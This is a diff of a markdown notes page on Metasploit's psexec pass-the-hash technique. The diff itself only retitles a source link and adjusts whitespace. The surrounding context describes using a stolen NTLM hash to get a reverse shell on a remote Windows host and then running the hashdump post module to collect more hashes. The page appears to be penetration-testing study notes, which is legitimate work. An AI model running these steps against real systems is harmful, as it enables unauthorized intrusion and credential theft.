@@ -9,9 +9,7 @@ hide:
   #- footer
 ---
 
-## PSEXEC PASS THE HASH
-
-<https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/>
+source <https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/>
 
 assuming that you already have the NTLM `username:ntlm-hash`, you can then run the reverse tcp shell
 
@@ -57,5 +55,5 @@ msf exploit(psexec) > exploit
 If the above executes successfully, you can then drop "into" into a shell on the remote host  
 meterpreter > `shell`
 
-you can also run `hasdump` to dump any additional NTLM hash
+you can also run `hasdump` to dump any additional NTLM hash  
 meterpreter > `run post/windows/gather/hashdump`
